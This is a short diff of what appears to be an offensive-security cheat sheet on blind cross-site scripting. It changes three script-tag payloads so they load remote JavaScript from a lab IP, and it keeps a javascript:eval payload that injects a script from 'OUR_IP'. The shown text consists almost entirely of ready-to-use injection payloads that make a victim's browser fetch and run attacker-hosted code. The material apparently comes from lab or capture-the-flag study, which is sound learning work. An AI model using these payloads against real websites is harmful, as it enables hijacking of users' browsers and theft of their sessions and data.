@@ -7,9 +7,9 @@ To know which input fields are vulnerable, we can try loading a remote `js` file
 
 ## TEST ALL PAYLOADS
 ```js
-<script src=http://10.10.14.7></script>
-'><script src=http://10.10.14.7></script>
-"><script src=http://10.10.14.7></script>
+<script src=http://10.10.14.2></script>
+'><script src=http://10.10.14.2></script>
+"><script src=http://10.10.14.2></script>
 
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
 
